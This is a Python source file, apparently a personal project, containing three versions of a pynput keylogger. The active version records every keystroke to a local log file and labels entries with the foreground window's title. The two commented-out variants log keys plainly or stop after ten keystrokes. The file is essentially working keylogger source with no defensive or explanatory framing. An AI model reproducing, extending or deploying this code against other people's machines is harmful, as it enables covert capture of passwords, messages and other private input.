

#listening to your keyboard- project
  #without active window recognition  
'''from pynput.keyboard import Listener

def writetofile(key):
    letter= str(key)
    letter= letter.replace("'","")
    
    if letter=='Key.space':
        letter= ' '

    if letter=='Key.shift':
        letter=''
    if letter=='Key.backspace':
        letter= ''
    if letter=='Key.enter':
        letter='\n'

    with open("log1.txt", "a") as f:
        f.write(letter)

with Listener(on_press=writetofile) as l:
    l.join()'''



#new improved verion with active window recognition
from pynput.keyboard import Listener
import win32gui

last_window = None  # Variable to track last active window

def get_active_window():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

def writetofile(key):
    global last_window
    letter = str(key).replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    elif letter in ['Key.shift', 'Key.backspace']:
        letter = ''
    elif letter == 'Key.enter':
        letter = '\n'

    current_window = get_active_window()

    with open("log1.txt", "a") as f:
        if current_window != last_window:  # Only log window title when it changes
            f.write(f"\n[{current_window}]\n")
            last_window = current_window  # Update last recorded window
        f.write(letter)

with Listener(on_press=writetofile) as l:
    l.join()















'''from pynput.keyboard import Listener

count = 0  # Counter for keystrokes

def writetofile(key):
    letter= str(key)
    letter=letter.replace("'","")

    

    with open("log1.txt", "a") as f:
        f.write(letter)

    global count
    count += 1

    if count >= 10:  # Stop after 10 keystrokes
        return False  # This stops the listener

with Listener(on_press=writetofile) as l:
    l.join()  # Keep listening until the condition is met
'''